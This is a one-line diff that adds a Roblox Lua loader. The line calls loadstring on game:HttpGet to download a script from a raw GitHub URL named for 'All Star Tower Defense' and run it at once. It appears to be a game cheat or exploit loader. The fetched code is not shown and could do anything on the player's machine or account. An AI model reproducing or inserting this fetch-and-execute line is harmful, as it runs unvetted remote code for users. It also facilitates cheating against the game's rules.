@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/og-all-star-tower-defense-spam7-msenouyzl1oy8j.lua"))()
